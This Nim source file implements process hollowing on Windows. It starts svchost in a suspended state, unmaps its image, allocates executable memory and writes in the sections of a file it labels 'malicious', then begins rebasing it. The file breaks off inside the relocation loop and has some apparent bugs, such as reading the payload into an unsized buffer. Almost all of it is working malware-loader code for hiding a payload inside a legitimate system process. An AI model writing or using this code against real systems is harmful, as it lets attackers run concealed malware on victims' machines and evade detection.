import winim/inc/windef
import winim/inc/winbase
import winim/inc/imagehlp
import winim/lean
import strutils
import dynlib

type
    ProcNtUnmapViewOfSection = proc (ProcessHandle: HANDLE, BaseAddress: PVOID): NTSTATUS {.stdcall.}
    BASE_RELOCATION_BLOCK* {.pure} = object
        PageAddress*: DWORD
        BlockSize*: DWORD
    PBASE_RELOCATION_BLOCK* = ptr BASE_RELOCATION_BLOCK
    TYPE_BASE_RELOCATION_ENTRY* {.pure} = object
        Offset*: USHORT
        Type*: USHORT
    PBASE_RELOCATION_ENTRY* = ptr TYPE_BASE_RELOCATION_ENTRY
    PEB64* {.pure.} = object
        InheritedAddressSpace*: BOOLEAN
        ReadImageFileExecOptions*: BOOLEAN
        BeingDebugged*: BOOLEAN
        Spare*: BOOLEAN
        Mutant*: HANDLE
        ImageBaseAddress*: PVOID
        LoaderData*: PPEB_LDR_DATA
        ProcessParameters*: PRTL_USER_PROCESS_PARAMETERS
        SubSystemData*: PVOID
        ProcessHeap*: PVOID
        FastPebLock*: PVOID
        FastPebLockRoutine*: PVOID
        FastPebUnlockRoutine*: PVOID
        EnvironmentUpdateCount*: ULONG
        KernelCallbackTable*: PVOID
        EventLogSection*: PVOID
        EventLog*: PVOID
        FreeList*: PVOID
        TlsExpansionCounter*: ULONG
        TlsBitmap*: PVOID
        TlsBitmapBits*: array[2, ULONG]
        ReadOnlySharedMemoryBase*: PVOID
        ReadOnlySharedMemoryHeap*: PVOID
        ReadOnlyStaticServerData*: ref PVOID
        AnsiCodePageData*: PVOID
        OemCodePageData*: PVOID
        UnicodeCaseTableData*: PVOID
        NumberOfProcessors*: ULONG
        NtGlobalFlag*: ULONG
        Spare2*: array[4, BYTE]
        CriticalSectionTimeout*: LARGE_INTEGER
        HeapSegmentReserve*: ULONG
        HeapSegmentCommit*: ULONG
        HeapDeCommitTotalFreeThreshold*: ULONG
        HeapDeCommitFreeBlockThreshold*: ULONG
        NumberOfHeaps*: ULONG
        MaximumNumberOfHeaps*: ULONG
        ProcessHeaps*: ref PVOID
        GdiSharedHandleTable*: PVOID
        ProcessStarterHelper*: PVOID
        GdiDCAttributeList*: PVOID
        LoaderLock*: PVOID
        OSMajorVersion*: ULONG
        OSMinorVersion*: ULONG
        OSBuildNumber*: ULONG
        OSPlatformId*: ULONG
        ImageSubSystem*: ULONG
        ImageSubSystemMajorVersion*: ULONG
        ImageSubSystemMinorVersion*: ULONG
        GdiHandleBuffer*: array[34, ULONG]
        PostProcessInitRoutine*: ULONG
        TlsExpansionBitmap*: ULONG
        TlsExpansionBitmapBits*: array[32, ULONG]
        SessionId*: ULONG

const
    BASE_RELOCATION_ENTRY* = TYPE_BASE_RELOCATION_ENTRY(
        Offset: 12, Type: 4
    )

var
    bufsize = int32(MAX_PATH)
    sourceFileName: wstring = newWString(bufsize)
    maliciousFileName: wstring
    x: int
    pi: PROCESS_INFORMATION
    si: STARTUPINFOW
    pbi: PROCESS_BASIC_INFORMATION
    dwReturnLength: DWORD
    peb: PEB64
    pImageDosHeader: PIMAGE_DOS_HEADER
    pMaliciousImageDosHeader: PIMAGE_DOS_HEADER
    pLoadedImage: ref LOADED_IMAGE
    pMaliciousLoadedImage: ref LOADED_IMAGE
    bytesRead: DWORD
    fileHeader: PIMAGE_NT_HEADERS
    maliciousFileNTHeaders: PIMAGE_NT_HEADERS


when isMainModule:
    # Get the path of the current executable (compiled by nim)
    x = GetModuleFileNameW(0, &sourceFileName, bufsize)
    
    if x == 0:
        echo "[!] GetModuleFileNameW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] PATH of the executable:\n\t", sourceFileName

    # Get the path of the binary "helloworld.exe" stored in the same directory
    # as the current one
    var t = `-$` sourceFileName
    var y = rfind(t.string, r"\")    
    maliciousFileName = `+$` t[0..y].string & "helloworld.exe"
    
    echo "[+] PATH of the malicious file:\n\t", maliciousFileName

    # create suspended process from svchost.exe
    # basicallly the "trojan horse"
    x = CreateProcessW(NULL,`+$` "svchost", NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi)
    if x == 0:
        echo "[!] CreateProcessW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully created the suspended process"

    # get the base address of the PEB
    x = NtQueryInformationProcess(pi.hProcess, 0, &pbi, (ULONG) sizeof(pbi), &dwReturnLength)
    if x != 0:
        echo "[!] NtQueryInformationProcess failed. NTSTATUS value: ", x
        system.quit(1)
    else:
        echo "[+] PEB Base Address: ", toHex(cast[LONGLONG](pbi.PebBaseAddress))

    x = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, (SIZE_T) sizeof(PEB64), NULL)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Image base address: ", toHex(cast[LONGLONG](peb.ImageBaseAddress))

    var buffer: array[0x2000, byte]
    var lpNumberOfBytesRead: SIZE_T 

    x = ReadProcessMemory(pi.hProcess, peb.ImageBaseAddress, &buffer, 0x2000, &lpNumberOfBytesRead)
    if x == 0:
        echo "[!] ReadProcessMemory failed. Error: ", GetLastError(), "\n\t"
        system.quit(1)
    else:
        echo "[+] ReadProcessMemory succeeded. Bytes copied: ", lpNumberOfBytesRead

    pLoadedImage = new(LOADED_IMAGE)

    pImageDosHeader = cast[PIMAGE_DOS_HEADER](&buffer)
    echo "[+] Address of the DOS Header: ", toHex(cast[LONGLONG](pImageDosHeader))

    echo "[+] DOS Header structure:\n\tMagic number: ", toHex(pImageDosHeader.e_magic),
        "\n\tSize of last page: ", pImageDosHeader.e_cblp,
        "\n\tNumber of pages: ", pImageDosHeader.e_cp,
        "\n\tRelocations: ", pImageDosHeader.e_crlc,
        "\n\tSize of header in paragraphs: ", pImageDosHeader.e_cparhdr,
        "\n\tMinimum extra paragraphs needed: ", pImageDosHeader.e_minalloc,
        "\n\tMaximum extra paragraphs needed: ", pImageDosHeader.e_maxalloc,
        "\n\tInitial (relative) SS value: ", pImageDosHeader.e_ss,
        "\n\tInitial SP value: ", pImageDosHeader.e_sp,
        "\n\tChecksum: ", pImageDosHeader.e_csum,
        "\n\tInitial IP value: ", pImageDosHeader.e_ip,
        "\n\tInitial (relative) CS value: ", pImageDosHeader.e_cs,
        "\n\tFile address of relocation table: ", pImageDosHeader.e_lfarlc,
        "\n\tOverlay number: ", pImageDosHeader.e_ovno,
        "\n\tReserved words: ", pImageDosHeader.e_res,
        "\n\tOEM identifier (for e_oeminfo): ", pImageDosHeader.e_oemid,
        "\n\tOEM information; e_oemid specific: ", pImageDosHeader.e_oeminfo,
        "\n\tReserved words: ", pImageDosHeader.e_res2,
        "\n\tFile address of new exe header: ", pImageDosHeader.e_lfanew
    
    var z = cast[LONGLONG](pImageDosHeader) + pImageDosHeader.e_lfanew
    echo "[+] PE File Header address: ", toHex(z)

    fileHeader = cast[PIMAGE_NT_HEADERS](cast[LONGLONG](&buffer) + pImageDosHeader.e_lfanew)
    pLoadedImage.FileHeader = fileHeader
    
    echo "[+] PE File Header structure:\n\tMachine: ", toHex(fileHeader.FileHeader.Machine),
        "\n\tNumber of sections: ",  fileHeader.FileHeader.NumberOfSections,
        "\n\tTimestamp: ",  toHex(fileHeader.FileHeader.TimeDateStamp),
        "\n\tPointer to symbol table: ",  fileHeader.FileHeader.PointerToSymbolTable,
        "\n\tNumber of symbols: ",  fileHeader.FileHeader.NumberOfSymbols,
        "\n\tSize of optional header: ",  fileHeader.FileHeader.SizeOfOptionalHeader,
        "\n\tCharacteristics: ",  fileHeader.FileHeader.Characteristics

    pLoadedImage.NumberOfSections = cast[ULONG](pLoadedImage.FileHeader.FileHeader.NumberOfSections)
    pLoadedImage.Sections = cast[PIMAGE_SECTION_HEADER](cast[LONGLONG](&buffer) + pImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64))

    var hFile: HANDLE = CreateFileW(maliciousFileName, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, 0)
    if hFile == INVALID_HANDLE_VALUE:
        echo "[!] CreateFileW failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Got a handle on the malicious file: ", maliciousFileName

    var dwFileSize: DWORD = GetFileSize(hFile, NULL)

    var buffer2: seq[BYTE]

    x = ReadFile(hFile, &buffer2, dwFileSize, &bytesRead, NULL)
    if x == 0:
        echo "[!] ReadFile failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Successfully read the bytes from the malicious file.\n\tSize: ", dwFileSize

    maliciousFileNTHeaders = cast[PIMAGE_NT_HEADERS](cast[LONGLONG](&buffer2) + (cast[PIMAGE_DOS_HEADER](&buffer2).e_lfanew))
    pMaliciousLoadedImage = new(LOADED_IMAGE)

    pMaliciousImageDosHeader = cast[PIMAGE_DOS_HEADER](&buffer2)
    pMaliciousLoadedImage.FileHeader = cast[PIMAGE_NT_HEADERS](cast[LONGLONG](&buffer2) + pMaliciousImageDosHeader.e_lfanew)

    pMaliciousLoadedImage.NumberOfSections = cast[ULONG](pMaliciousLoadedImage.FileHeader.FileHeader.NumberOfSections)
    pMaliciousLoadedImage.Sections = cast[PIMAGE_SECTION_HEADER](cast[LONGLONG](&buffer2) + pMaliciousImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS));

    echo "[+] Managed to get the headers and the sections from the malicious file"

    let ntdll: LibHandle = loadLib("ntdll")
    if isNil(ntdll):
        echo "[!] Failed to load ntdll.dll"
        system.quit(1)

    let NtUnmapViewOfSection = cast[ProcNtUnmapViewOfSection](ntdll.symAddr("NtUnmapViewOfSection"))
    if isNil(NtUnmapViewOfSection):
        echo "[!] Failed to get the address of 'NtUnmapViewOfSection'"
        system.quit(1)
    else:
        echo "[+] Got the address of the function NtUnmapViewOfSection"
    
    let unmapNTStatus : NTSTATUS = NtUnmapViewOfSection(pi.hProcess, peb.ImageBaseAddress)
    if unmapNTStatus != 0:
        echo "[!] NtUnmapViewOfSection failed. NTSTATUS error: ", unmapNTStatus
        system.quit(1)
    else:
        echo "[+] Unmapped the bytes from the benign process"

    let baseAddressAllocatedRegion : LPVOID = VirtualAllocEx(pi.hProcess, peb.ImageBaseAddress, maliciousFileNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if isNil(baseAddressAllocatedRegion):
        echo "[!] VirtualAllocEx failed. Error: ", GetLastError()
        system.quit(1)
    else:
        echo "[+] Managed to allocate memory in the benign process"

    let relocationDelta : QWORD = cast[QWORD](cast[LONGLONG](peb.ImageBaseAddress) - maliciousFileNTHeaders.OptionalHeader.ImageBase)
    
    echo "[+] Relocation delta: ", relocationDelta,
        "\n\tSource image base address: ", toHex(maliciousFileNTHeaders.OptionalHeader.ImageBase),
        "\n\tDestination image base address: ", toHex(cast[LONGLONG](peb.ImageBaseAddress))

    maliciousFileNTHeaders.OptionalHeader.ImageBase = cast[ULONGLONG](peb.ImageBaseAddress)
    x = WriteProcessMemory(pi.hProcess, peb.ImageBaseAddress, &buffer, maliciousFileNTHeaders.OptionalHeader.SizeOfHeaders, NULL)
    if x == 0:
        echo "[!] WriteProcessMemory failed. Error:", GetLastError()
        system.quit(1)
    else:
        echo "[+] Managed to write process memory"

    let sectionHeaderSize = sizeof(IMAGE_SECTION_HEADER)
    let sectionHeaderOffset = 1 * sectionHeaderSize

    var pImageSectionHeader: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(maliciousFileNTHeaders)
    var sectionHeaderNextAddress : int64

    for i in countup(0, cast[int](pMaliciousLoadedImage.NumberOfSections - 1)):
        echo "[+] Copying data from the section: ", &pImageSectionHeader.Name
        echo "\tSection address: ", toHex(cast[int64](pImageSectionHeader))
        echo "\tDOS Header address: ", toHex(cast[ByteAddress](pMaliciousImageDosHeader))
        echo "\tPointer to raw data: ", pImageSectionHeader.PointerToRawData

        let sourceBufferAddress : pointer = cast[pointer](cast[ByteAddress](pMaliciousImageDosHeader) + pImageSectionHeader.PointerToRawData)
        
        echo "\tSize of raw data: ", pImageSectionHeader.SizeOfRawData
        echo "\tAddress of the source buffer: ", toHex(cast[ByteAddress](sourceBufferAddress))
        
        # var buffer3 : array[1024, BYTE]
        # if i == 0:
        #     copyMem(&buffer3, sourceBufferAddress, pImageSectionHeader.SizeOfRawData)
        
        let pSectionDestination: PVOID = cast[pointer](cast[ByteAddress](peb.ImageBaseAddress) + pImageSectionHeader.VirtualAddress)

        x = WriteProcessMemory(pi.hProcess, pSectionDestination, &buffer[pImageSectionHeader.PointerToRawData], pImageSectionHeader.SizeOfRawData, NULL)
        if x == 0:
            echo "[!] WriteProcessMemory failed. Error:", GetLastError()
            system.quit(1)
        else:
            echo "[+] Successfully copied the section from the malicious image to the benign one"

        # calculate the address of the next section
        sectionHeaderNextAddress = cast[ByteAddress](pImageSectionHeader) + sectionHeaderOffset
        pImageSectionHeader = cast[ptr IMAGE_SECTION_HEADER](sectionHeaderNextAddress)

        # the operator "[]" is used for dereferencing a pointer
        # type is used to get the type
        # echo type(pImageSectionHeader[])
        # therefore, from PIMAGE_SECTION_HEADER you'll get IMAGE_SECTION_HEADER.

    

    if relocationDelta != 0:
        echo "[+] Source image must be rebased"
        
        pImageSectionHeader = IMAGE_FIRST_SECTION(maliciousFileNTHeaders)

        for i in countup(0, cast[int](pMaliciousLoadedImage.NumberOfSections) - 1):
            if not (".reloc" in $ &pImageSectionHeader.Name):
                echo "[+] Ignoring section: ", &pImageSectionHeader.Name

                sectionHeaderNextAddress = cast[ByteAddress](pImageSectionHeader) + sectionHeaderOffset
                pImageSectionHeader = cast[ptr IMAGE_SECTION_HEADER](sectionHeaderNextAddress)
                continue

            echo "[+] Rebasing section: ", &pImageSectionHeader.Name
            echo "\tSection address: ", toHex(cast[int64](pImageSectionHeader))

            let dwRelocAddr: DWORD = pImageSectionHeader.PointerToRawData
            var dwOffset = 0;
            let relocData: IMAGE_DATA_DIRECTORY = maliciousFileNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]

            echo "[+] Size of data to be relocated: ", relocData.Size

            while dwOffset < relocData.Size:
                let pBlockheader: PBASE_RELOCATION_BLOCK = cast[PBASE_RELOCATION_BLOCK](buffer[dwRelocAddr + dwOffset])
    
                dwOffset += sizeof(BASE_RELOCATION_BLOCK)
                
                var dwEntryCount: DWORD = cast[DWORD]((pBlockheader.BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY))

                let pBlocks: PBASE_RELOCATION_ENTRY = cast[PBASE_RELOCATION_ENTRY](buffer[dwRelocAddr + dwOffset])

                var k : int
                for k in countup(0, dwEntryCount - 1):
                    dwOffset += sizeof(BASE_RELOCATION_ENTRY)

                    echo "[+] Base Relocation Entry Type: ", pBlocks.Type

                    if pBlocks.Type == 0:
                        continue

